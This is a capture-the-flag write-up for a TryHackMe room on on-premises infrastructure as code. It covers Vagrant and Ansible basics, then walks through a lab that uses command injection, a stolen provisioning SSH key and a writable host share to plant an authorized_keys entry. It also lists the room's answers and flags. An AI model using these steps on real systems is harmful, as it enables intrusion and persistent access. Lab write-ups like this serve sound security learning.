# TryHackMe Room Writeup — On-Premises IaC

---

## On-Premises IaC

- On-premises IaC refers to using infrastructure as code to deploy systems and services on an internal network.
- If you self-host using GitLab, you have full control over the entire stack.
- Use **on-prem IaC** if you want more control over your pipeline or have strict data handling and regulatory requirements.
- Use **off-prem IaC** if you want more flexibility with deployments.

---

## Vagrant Basics

- Vagrant is a software solution for building and maintaining portable virtual software development environments.
- Vagrant can be used to deploy not only Docker instances, but also the actual servers that host them.
- A **Vagrantfile** is used for provisioning.

**Question Answers:**
- `vagrant up`
- `vagrant up webserver`

---

## Ansible Basics

- A key difference between Ansible and Vagrant is that Ansible performs **version control on the steps it executes**.
- Vagrant handles the main deployment of hosts; Ansible then handles host-specific configuration.
- Ansible provisions from a **playbook** file.
- **Template** is the second answer.
- A role can be provisioned with a single config request.

---

## Building an On-Prem Workflow

Steps performed during the practical exercise:

1. Navigated to the stated directory.
2. Ran `vagrant up` to boot up the pipeline.
3. Verified with `docker ps`.
4. Started the web app with:
   ```bash
   vagrant docker-exec -it webserver -- python3 /app/app.py
   ```
5. Navigated to the IP in the browser and retrieved the flag.

> Flag: `THM{IaC.Pipelines.Can.Be.Fun}`

---

## Security Concerns

The biggest security dependencies in on-prem IaC are the **base images** that are pulled and used to build the infrastructure. A compromised base image affects everything built on top of it.

---

## IaC Challenge

### Setup — SSH into the Host

```bash
ssh entry@10.67.131.203
# password: entry
```

Read the Vagrantfile to understand the infrastructure:
```bash
cat ~/iac/Vagrantfile
```

The Vagrantfile defines two services — a **dbserver** (MySQL) at `172.20.128.3` and a **webserver** at `172.20.128.2`. These are internal Docker network IPs only reachable from the host you're SSH'd into.

---

### Flag 1 — Dev Bypass in the Web App

A hidden "Dev Test DB" button in `signin.html` POSTs to `/api/testDB` with a `_command` field — a command injection vector left over from development.

Tunnel the webserver port to your local machine:
```bash
ssh -N -L 8080:172.20.128.2:80 entry@10.67.131.203
```

Navigate to `http://localhost:8080`, use the Dev Test DB button, and inject:
```
_command=cat /flag1-of-4.txt
```

> Flag 1: `THM{Dev.Bypasses.and.Checks.can.be.Dangerous}`

---

### Flag 2 — Exposed Deployment SSH Key

The private key Vagrant uses to provision the webserver is left readable at `/home/ubuntu/iac/keys/id_rsa`. Use it to SSH directly into the webserver container:

```bash
scp entry@10.67.131.203:/home/ubuntu/iac/keys/id_rsa ./id_rsa_vagrant
chmod 600 id_rsa_vagrant
ssh -i id_rsa_vagrant root@172.20.128.2
cat /flag2-of-4.txt
```

> Flag 2: `THM{IaC.Deployment.Keys.Must.be.Removed}`

---

### Flag 3 — Overly Permissive Provisioning Share

The Vagrantfile mounts the entire `/home/ubuntu/` directory into the webserver container at `/tmp/datacopy` — a share that was never removed. From inside the container:

```bash
cat /tmp/datacopy/flag3-of-4.txt
```

> Flag 3: `THM{IaC.Shares.Should.be.Restricted}`

---

### Flag 4 — Write Back to Host via Share

Since you have root inside the container and the host's home directory is mounted at `/tmp/datacopy`, you can write back to the host. Inject your public key into the host's authorized_keys:

```bash
echo "ssh-rsa YOUR_PUBLIC_KEY" >> /tmp/datacopy/.ssh/authorized_keys
```

Then SSH into the host as `ubuntu`:
```bash
ssh -i your_private_key ubuntu@10.67.131.203
cat /home/ubuntu/flag4-of-4.txt
```

> Flag 4: `THM{Provisioners.Usually.Have.Privileged.Access}`
